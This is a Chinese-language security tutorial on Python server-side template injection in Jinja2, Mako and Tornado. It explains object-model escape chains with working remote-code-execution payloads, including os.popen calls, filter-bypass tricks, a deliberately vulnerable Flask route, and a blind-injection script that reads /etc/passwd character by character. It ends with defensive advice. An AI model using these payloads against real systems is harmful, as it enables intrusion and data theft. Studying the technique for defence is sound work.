---
title: "Python SSTI · Jinja2"
date: 2026-04-12 00:00:00 +0800
categories:
  - ssti
  - web
  - security
tags:
  - python
  - jinja2
---

{% raw %}

Java Velocity 靠内省 + 反射拉长链；Python Jinja2 靠对象模型 + 魔术方法拉长链。本质都是模板语言 + 宿主语言的对象能力叠加出来的 RCE 面。

Python 中万物皆对象。当模板引擎将后端传入的 Python 对象直接交给模板语法操作时，攻击者就能利用对象内置的魔术方法，从一个普通变量出发，逐步获取到系统的命令执行接口。

本文将以不过时的底层模型为主线，结合 Jinja2、Mako、Tornado 等主流引擎，拆解从经典原理到现代 WAF 对抗的完整利用体系。

***

## Python 对象模型透传

模板引擎要实现动态渲染，必须解析模板中的变量访问语法。不同引擎对底层对象能力的暴露程度不同：

- **透传型**：模板中的 `{{ obj }}` 直接对应 Python 中的 `obj` 对象，引擎仅做简单的属性查找和方法调用转发（如 Jinja2、Mako）。
- **包装型**：模板中的变量被引擎封装为安全节点，屏蔽了对底层 Python 属性的直接访问（如 Django DTL、Tornado）。

一旦确认目标使用的是“透传型”引擎，攻击就可以基于 Python 的**魔术方法**展开：

- `__class__`：返回对象所属的类。
- `__mro__` / `__base__`：返回类的继承链，用于向上定位到所有类的基类 `<class 'object'>`。
- `__subclasses__()`：返回继承自 `object` 的所有子类列表。
- `__globals__`：返回函数定义时的全局命名空间字典。

***

## 0x03 经典基于继承树的遍历

这是理解 Python SSTI 必须掌握的基础模型。其核心逻辑是：从上下文必然存在的普通对象（如空字符串 `''`）出发，沿着 Python 类的继承树逐层向下遍历，寻找已加载的危险模块（如 `os`）。

**Payload 结构**：

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['os'].popen('id').read() }}
```

**逻辑**：

1. 通过 `''.__class__.__mro__[1]` 拿到基类 `<class 'object'>`。
2. 通过 `.__subclasses__()` 获取当前 Python 进程中所有类的列表。
3. 通过 `[138]` 定位内部引用了 `os` 模块的类（如 `warnings.catch_warnings`）。
4. 通过 `.__init__.__globals__['os']` 提取 `os` 模块并执行命令。

**局限性**：该模型依赖硬编码的索引 `[138]`（随操作系统和 Python 版本变化），且包含 `__subclasses__` 等明显的特征字符串，在现代安全设备规则匹配下极易被拦截。

***

## 0x04 基于全局对象的短链

#### 代码示例

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'guest')
    # 漏洞点：用户输入直接作为模板源码编译
    return render_template_string(name)
```

#### 第一步：恶意 Payload

```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
```

*(注：在某些环境中可能需要写成* *`lipsum.__globals__['__builtins__']['__import__']('os')...`，此处以常见的直接引用为例)*

#### 第二步：模板解析，生成 AST

Jinja2 引擎接收到字符串后，进行词法和语法分析，将其切分为 AST 节点：

1. `lipsum`：被解析为 `Name` 节点,代表一个变量或函数对象。
2. `.__globals__`：被解析为 `Getattr` 节点,代表属性访问。
3. `['os']`：被解析为 `Getitem` 节点,代表字典键取值。
4. `.popen('id').read()`：被解析为 `Call` 节点,代表函数调用。

#### 第三步：节点执行 —— 函数对象的 `__globals__` 透传

当 Jinja2 执行到 `Getattr` 节点（即 `lipsum.__globals__`）时，引擎底层会调用 Python 的 `getattr(lipsum, '__globals__')`。

**为什么** **`lipsum`** **能拿到** **`os`？**

1. **`lipsum`** **的本质**：它是 Jinja2 引擎在初始化 `Environment` 时，硬编码预置到模板上下文中的一个**全局函数对象**（底层对应 `jinja2.utils.generate_lorem_ipsum` 函数）。
2. **Python 函数的** **`__globals__`** **属性**：在 Python 底层，任何一个函数对象都维护着一个名为 `__globals__` 的字典，该字典保存了**定义该函数时所在模块的全局命名空间**。
3. **空间跨越**：通过访问 `lipsum.__globals__`，攻击者直接从模板上下文“跳跃”到了 `jinja2.utils` 模块的全局作用域。在这个全局字典中，通常包含了当前环境加载的其他模块引用或内置模块 `__builtins__`，从而可以直接提取出 `os` 模块，**跳过了经典模型中`__subclasses__()`** **枚举过程**。

#### 第四步：插值执行 —— RCE 触发

AST 继续遍历执行后续的 `Getitem` 和 `Call` 节点。

**核心调用链**：

```text
AST 树执行
  → 获取 lipsum 对象 (Python Function)
    → 获取 lipsum.__globals__ (Python Dict: jinja2.utils 模块的全局变量)
      → 提取字典中的 'os' 键 (Python Module: os)
        → 执行 os.popen('id') (执行系统命令)
          → 执行 .read() (读取结果并返回给模板输出)
```

***

## 其他模板引擎的 SSTI

在 Python 生态中，不同引擎对宿主语言对象能力的暴露程度决定了其被利用的路径。

| 引擎                 | 对象透传程度      | 直接 RCE 难度 | 核心利用路径                 |
| :----------------- | :---------- | :-------- | :--------------------- |
| **Jinja2** (Flask) | 完全透传        | 低         | 全局对象短链或继承树遍历           |
| **Mako** (Pyramid) | 完全透传        | 极低        | 直接编写原生 Python 代码       |
| **Tornado**        | 默认屏蔽 `_` 属性 | 高         | 利用注入的 `handler` 对象读取配置 |
| **Django DTL**     | 严格隔离        | 不可能       | 无 RCE 风险，仅存在逻辑破坏       |

#### 1. Mako：原生代码执行

Mako 模板在底层会被直接编译为 Python 代码文件执行，没有任何属性过滤机制。

```mako
<%
import os
x = os.popen('id').read()
%>
${x}
```

#### 2. Tornado：配置信息泄露

Tornado 默认禁止访问以下划线开头的属性。但其会在模板上下文中注入当前请求的 `handler` 对象。通过该对象可以读取后端的敏感配置（如数据库密码、Secret Key），通常不直接用于 RCE。

```jinja2
{{ handler.settings }}
```

***

## 绕过

当现代短链中的 `__globals__`、`os` 等关键字也被过滤时，需要利用 Jinja2 的原生语法特性对 Payload 进行拆分，将特征转移到 HTTP 协议的其他字段中。

#### 绕过一：消除特征

使用 `attr()` 过滤器替代点号 `.` 进行属性访问，使用 `request.args` 通过动态赋值，从 URL GET 参数中动态获取字符串.

**模板端 Payload**：

```jinja2
{{ (lipsum|attr(request.args.g)).os.popen(request.args.c).read() }}
```

**HTTP 请求端**：

```http
GET /?g=__globals__&c=id HTTP/1.1
```

安全设备解析模板字符串时，只能看到合法的属性访问和参数获取，无法匹配到完整的危险调用链。

#### 绕过二：盲注

当命令执行结果无法直接输出到页面时，结合条件判断语句进行布尔盲注。
假设我们要确认 /etc/passwd 中是否存在 root:x:0:0 这个片段：

模板端 Payload：

```jinja2
{% if 'root:x' in (lipsum|attr(request.args.g)).os.popen(request.args.c).read() %}success{% endif %}
```

HTTP 请求端：

```http
GET /?g=__globals__&c=cat /etc/passwd HTTP/1.1
```

逻辑：如果执行结果里包含 root:x，页面回显 success；否则页面为空。这就能确认命令执行成功且读取到了目标内容。

逐字符读取脚本
如果我们要读取一个未知的命令输出（比如 ls /etc），我们不知道里面有什么字母，就需要像 SQL 盲注一样，逐字符提取。Jinja2 完美支持 Python 的字符串切片语法 \[0:1]。

以下是在实战中，安全人员通常会编写的 Python 自动化盲注脚本的核心逻辑：

```python
import requests
import string

target_url = "http://target.com/greet"
# 模板中的盲注逻辑：截取命令输出的第 index 个字符，判断是否等于传入的 char
# 注意：[0:1] 是 Python 切片语法，Jinja2 完全支持
template_payload = "{% if (lipsum|attr(request.args.g)).os.popen(request.args.c).read()[request.args.i:request.args.j] == request.args.ch %}success{% endif %}"

extracted_data = ""
# 假设输出不超过 100 个字符，根据实际情况调整
for index in range(0, 100):
    found = False
    # 常见的可打印字符集合，可按需扩大到所有 ASCII
    for char in string.printable:
        # 构造 GET 参数
        params = {
            "g": "__globals__",
            "c": "cat /etc/passwd",  # 你想执行的命令
            "i": str(index),         # 切片起始位
            "j": str(index + 1),     # 切片结束位
            "ch": char               # 猜测的字符
        }
        
        # 将恶意 payload 放在触发 SSTI 的参数中（假设是 name 参数）
        response = requests.get(target_url, params={"name": template_payload, **params})
        
        if "success" in response.text:
            extracted_data += char
            print(f"[+] 当前已提取: {extracted_data}")
            found = True
            break
            
    # 如果遍历完所有字符都没匹配上，说明读取到了字符串末尾（如换行符或空）
    if not found:
        print(f"[-] 在索引 {index} 处未找到匹配字符，读取结束。")
        break

print(f"\n[+] 最终盲注读取结果:\n{extracted_data}")
```

脚本底层原理解析
当脚本发送请求：?name={%if...%}...\&i=0\&j=1\&ch=r... 时，Jinja2 引擎内部经历了这样的运算：

执行命令：(lipsum|attr('__globals__')).os.popen('cat /etc/passwd').read()，得到一个长字符串，比如 "root:x:0:0:..."。
执行切片：引擎根据参数 i=0, j=1，对长字符串执行 \[0:1]，截取出了首字符 "r"。
布尔判断：判断截取出的 "r" 是否等于参数 ch 传进来的 "r"。
返回结果：相等则渲染出 success，Python 脚本接收到 success，确认第 0 个字符是 r，然后继续猜第 1 个字符。
-------------------------------------------------------------------

## 0x07 防御

#### 1. 沙箱机制的局限性

Jinja2 提供了 `SandboxedEnvironment`，通过重写属性访问逻辑拦截对 `__` 开头属性的调用。但 Python 底层存在大量隐式类型转换（如 `__format__`），历史上多次出现绕过沙箱获取真实对象引用的漏洞。沙箱不能作为对抗高级攻击者的唯一防线。

#### 2. 终极防御架构：分离代码与数据

SSTI 的根本成因是用户输入被作为模板源码进行了编译。防御的核心是确保用户输入仅作为数据传入已编译的模板。

```python
# 危险：将用户输入作为模板源码动态编译
template = jinja2_env.from_string("Hello " + user_input)

# 安全：模板文件预编译，用户输入仅作为变量数据
# 此时 user_input 无论包含 {{}} 还是 <% %>，都只会被作为纯文本渲染
return render_template('greeting.html', name=user_input)
```

***

## 总结

1. **统一原理**：Python SSTI 的本质是模板引擎暴露了宿主语言的对象能力，通过魔术方法链实现权限提升。
2. **模型演进**：利用方式从依赖环境索引的 `__subclasses__` 经典长链，演进为基于内置全局对象（如 `lipsum`）直接获取 `__globals__` 字典的现代短链。
3. **对抗核心**：现代绕过的核心在于利用引擎原生语法（如 `attr()`、`request.args`）拆分恶意特征，对抗基于正则匹配的安全设备。
4. **防御底线**：禁用动态编译接口（如 `from_string`、`render_template_string`），严格实行模板代码与用户数据的分离。

{% endraw %}
